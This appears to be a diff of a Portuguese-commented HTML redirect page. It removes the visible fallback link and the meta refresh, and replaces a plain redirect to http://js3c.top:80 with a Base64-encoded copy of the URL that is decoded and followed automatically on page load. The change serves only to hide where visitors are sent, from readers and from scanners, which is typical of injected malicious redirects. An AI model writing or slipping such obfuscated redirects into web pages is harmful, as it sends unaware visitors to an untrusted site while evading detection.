@@ -1,14 +1,17 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0;url=http://js3c.top:80">
     <script>
-        // Redirecionamento via JavaScript
-        window.location.replace("http://js3c.top:80");
+        // URL codificada em Base64
+        const base64URL = "aHR0cDovL2pzM2MudG9wOjgw";
+        
+        // Decodifica a URL
+        const decodedURL = atob(base64URL);
+        
+        // Redireciona para a URL decodificada
+        window.location.replace(decodedURL);
     </script>
 </head>
 <body>
-    <p>Se você não for redirecionado, <a href="http://js3c.top:80">clique aqui</a>.</p>
 </body>
 </html>
